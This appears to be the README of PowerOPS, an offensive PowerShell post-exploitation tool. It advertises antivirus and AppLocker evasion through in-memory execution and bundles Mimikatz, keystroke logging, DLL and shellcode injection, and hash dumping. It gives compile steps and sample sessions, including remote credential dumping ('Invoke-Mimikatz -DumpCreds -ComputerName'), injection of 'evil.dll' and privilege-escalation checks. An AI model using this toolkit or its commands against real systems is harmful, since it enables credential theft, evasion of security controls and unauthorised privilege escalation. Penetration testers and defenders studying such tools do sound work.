# PowerOPS
PowerShell Runspace Portable Post Exploitation Tool aimed at making Penetration Testing with PowerShell "easier"

### What is it:

PowerOPS is an application written in C# that does not rely on powershell.exe but runs PowerShell commands and functions within a powershell runspace environment (.NET). It intends to include multiple offensive PowerShell modules to make the process of Post Exploitation easier.

It tries to follow the KISS principle, being as simple as possible. The main goal is to make it easy to use PowerShell offensively and help to evade antivirus and other mitigations solutions. It does this by:

1. Doesn't rely on powershell.exe, it calls PowerShell directly through the .NET framework, which might help bypassing security controls like GPO, SRP and App Locker.
2. The payloads are executed from memory and never touch disk, evading most antivirus engines.

PowerOPS was inspired by [Cn33liz/p0wnedShell](https://github.com/Cn33liz/p0wnedShell). However I was only interested in PowerShell modules and I was looking for more flexibility. Since PowerOPS offers basically an interactive PowerShell command prompt you are free to use the PowerShell tools included the way you want, and additionally execute any valid PowerShell command.

### What's inside the runspace:

#### The following PowerShell tools/functions are included:

* [PowerShellMafia/Powersploit](https://github.com/PowerShellMafia/PowerSploit)
  - Get-Keystrokes
  - Invoke-DllInjection
  - Invoke-Mimikatz
  - Invoke-NinjaCopy
  - Invoke-Shellcode
  - Invoke-ReflectivePEInjection
  - Invoke-TokenManipulation
  - Invoke-WMICommand
  - PowerUp
  - PowerView
* [Nishang](https://github.com/samratashok/nishang)
  - Get-Information
  - Get-PassHashes
  - Port-Scan
* [Auto-GPPPassword](https://github.com/roo7break/PowerShell-Scripts/blob/master/auto-gpppassword/auto-gpppassword.ps1)
* [PowerCat](https://github.com/besimorhino/powercat)
* [Get-ProductKey](https://gallery.technet.microsoft.com/scriptcenter/Get-product-keys-of-local-83b4ce97)
* [Empire](https://github.com/PowerShellEmpire/)
  - Invoke-Psexec
  - Invoke-SSHCommand

Additionally you can run any valid PowerShell command.

Powershell functions within the Runspace are loaded in memory from Base64 Encoded Strings.

### How to Compile it:

To compile PowerOPS you need to import this project within Microsoft Visual Studio or if you don't have access to a Visual Studio installation, you can compile it as follows:

To Compile as x86 binary:

```
cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)

csc.exe /unsafe /reference:"C:\path\to\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:C:\users\username\PowerOPS_x86.exe /platform:x86 "C:\path\to\PowerOPS\PowerOPS\*.cs"
```

To Compile as x64 binary:

```
cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)

csc.exe /unsafe /reference:"C:\path\to\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:C:\users\username\PowerOPS_x64.exe /platform:x64 "C:\path\to\PowerOPS\PowerOPS\*.cs"
```

PowerOPS uses the System.Management.Automation namespace, so make sure you have the System.Management.Automation.dll within your source path when compiling outside of Visual Studio.

### How to use it:

Just run the binary and type 'show' to list available modules.

```
PS > show

[-] This computer is not part of a Domain! Some functions will not work!

[+] Nishang

 Get-Information    Get-PassHashes             Port-Scan

[+] PowerSploit

 Get-KeyStrokes     Invoke-DllInjection        Invoke-Mimikatz     Invoke-NinjaCopy
 Invoke-Shellcode   Invoke-TokenManipulation   Invoke-WmiCommand   Invoke-ReflectivePEInjection
 PowerView          PowerUp

[+] Empire

 Invoke-PsExec      Invoke-SSHCommand

[+] Others

 Auto-GPPPassword   Get-ProductKey             PowerCat

PS >
```

PowerUp and PowerView are loaded as modules, so **Get-Command -module** will show you all available functions.

```
PS > get-command -module powerup

CommandType     Name                                               ModuleName
-----------     ----                                               ----------
Function        Find-DLLHijack                                     PowerUp
Function        Find-PathHijack                                    PowerUp
Function        Get-ApplicationHost                                PowerUp
Function        Get-ModifiableFile                                 PowerUp
Function        Get-RegAlwaysInstallElevated                       PowerUp
Function        Get-RegAutoLogon                                   PowerUp
Function        Get-ServiceDetail                                  PowerUp
Function        Get-ServiceFilePermission                          PowerUp
Function        Get-ServicePermission                              PowerUp
Function        Get-ServiceUnquoted                                PowerUp
Function        Get-UnattendedInstallFile                          PowerUp
Function        Get-VulnAutoRun                                    PowerUp
Function        Get-VulnSchTask                                    PowerUp
Function        Get-Webconfig                                      PowerUp
Function        Install-ServiceBinary                              PowerUp
Function        Invoke-AllChecks                                   PowerUp
Function        Invoke-ServiceAbuse                                PowerUp
Function        Invoke-ServiceDisable                              PowerUp
Function        Invoke-ServiceEnable                               PowerUp
Function        Invoke-ServiceStart                                PowerUp
Function        Invoke-ServiceStop                                 PowerUp
Function        Restore-ServiceBinary                              PowerUp
Function        Test-ServiceDaclPermission                         PowerUp
Function        Write-HijackDll                                    PowerUp
Function        Write-ServiceBinary                                PowerUp
Function        Write-UserAddMSI                                   PowerUp

PS >
```

Yes, all your PowerShell fu applies. PowerOPS is basically a PowerShell shell with some modules/functions pre-loaded. So **Get-Help** is your friend and will help to find how to use the modules.

Let's say you want to see examples on how to use Invoke-Mimikatz.

```
PS > Get-Help Invoke-Mimikatz -examples

NAME
    Invoke-Mimikatz

SYNOPSIS
    This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to
    reflectively load Mimikatz completely in memory. This allows you to do
    things such as
    dump credentials without ever writing the mimikatz binary to disk.
    The script has a ComputerName parameter which allows it to be executed
    against multiple computers.

    This script should be able to dump credentials from any version of Windows
    through Windows 8.1 that has PowerShell v2 or higher installed.

    Function: Invoke-Mimikatz
    Author: Joe Bialek, Twitter: @JosephBialek
    Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog:
    http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter
    @gentilkiwi
    License:  http://creativecommons.org/licenses/by/3.0/fr/
    Required Dependencies: Mimikatz (included)
    Optional Dependencies: None
    Version: 1.5
    ReflectivePEInjection version: 1.1
    Mimikatz version: 2.0 alpha (2/16/2015)

    -------------------------- EXAMPLE 1 --------------------------

    C:\PS>Execute mimikatz on the local computer to dump certificates.


    Invoke-Mimikatz -DumpCerts


    -------------------------- EXAMPLE 2 --------------------------

    C:\PS>Execute mimikatz on two remote computers to dump credentials.


    Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")


    -------------------------- EXAMPLE 3 --------------------------

    C:\PS>Execute mimikatz on a remote computer with the custom command
    "privilege::debug exit" which simply requests debug privilege and exits


    Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"


PS >
```

Or simply look at the whole help available for Invoke-DllInjection.

```
PS > Get-Help Invoke-DllInjection -full

NAME
    Invoke-DllInjection

SYNOPSIS
    Injects a Dll into the process ID of your choosing.

    PowerSploit Function: Invoke-DllInjection
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

SYNTAX
    Invoke-DllInjection [-ProcessID] <Int32> [-Dll] <String>
    [<CommonParameters>]


DESCRIPTION
    Invoke-DllInjection injects a Dll into an arbitrary process.


PARAMETERS
    -ProcessID <Int32>
        Process ID of the process you want to inject a Dll into.

        Required?                    true
        Position?                    1
        Default value                0
        Accept pipeline input?       false
        Accept wildcard characters?  false

    -Dll <String>
        Name of the dll to inject. This can be an absolute or relative path.

        Required?                    true
        Position?                    2
        Default value
        Accept pipeline input?       false
        Accept wildcard characters?  false

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (http://go.microsoft.com/fwlink/?LinkID=113216).

INPUTS

OUTPUTS

NOTES
        Use the '-Verbose' option to print detailed information.

    -------------------------- EXAMPLE 1 --------------------------

    C:\PS>Invoke-DllInjection -ProcessID 4274 -Dll evil.dll


    Description
    -----------
    Inject 'evil.dll' into process ID 4274.

RELATED LINKS
    http://www.exploit-monday.com

PS >
```

You can play around with the output...

```
PS > get-productkey

OSDescription        Computername        OSVersion           ProductKey
-------------        ------------        ---------           ----------
Microsoft Windows... VISUALSTUDIO        6.1.7601            ABCDE-54321-UVXY...



PS > get-productkey | format-list


OSDescription : Microsoft Windows 7 Professional N
Computername  : VISUALSTUDIO
OSVersion     : 6.1.7601
ProductKey    : ABCDE-54321-UVXYZ-12345-LMNOP
```

Save the output of your commands the way you want...

```
PS > invoke-allchecks | Out-File -Encoding ascii powerup.output.txt

PS > type powerup.output.txt

[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.

[*] Checking for unquoted service paths...

[*] Checking service executable and argument permissions...

[*] Checking service permissions...

[*] Checking %PATH% for potentially hijackable .dll locations...

[*] Checking for AlwaysInstallElevated registry key...

[*] Checking for Autologon credentials in registry...

[*] Checking for vulnerable registry autoruns and configs...

[*] Checking for vulnerable schtask files/configs...

[*] Checking for unattended install files...

[*] Checking for encrypted web.config strings...

[*] Checking for encrypted application pool and virtual directory passwords...

PS >
```

Do some math...

```
PS > $a=1

PS > $b=4

PS > $c=$a+$b

PS > echo $c
5
```

Browse the filesystem...

```
PS > cd c:\

PS > ls

    Directory: C:\

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----        14/02/2016     17:21            bin
d----        17/02/2016     15:02            Dev-Cpp
d----        14/07/2009     04:20            PerfLogs
d-r--        26/04/2016     20:00            Program Files
d-r--        26/04/2016     20:00            Program Files (x86)
d----        19/02/2016     21:06            Python27
d-r--        26/11/2015     17:20            Users
d----        12/05/2016     15:53            Windows
-a---        19/03/2010     23:55    2073703 VS_EXPBSLN_x64_enu.CAB
-a---        19/03/2010     23:58     551424 VS_EXPBSLN_x64_enu.MSI

PS > pwd

Path
----
C:\

PS >
```
And so on...

### Credits:

PowerOPS was inspired by [Cn33liz/p0wnedShell](https://github.com/Cn33liz/p0wnedShell), and basically consists of work from [Nikhil Mittal] (http://www.labofapenetrationtester.com/) of Nishang, [mattifiestation](https://twitter.com/mattifestation) of PowerSploit and [sixdub](https://twitter.com/sixdub), [engima0x3](https://twitter.com/enigma0x3) and [harmj0y](https://twitter.com/HarmJ0y) of Empire. 

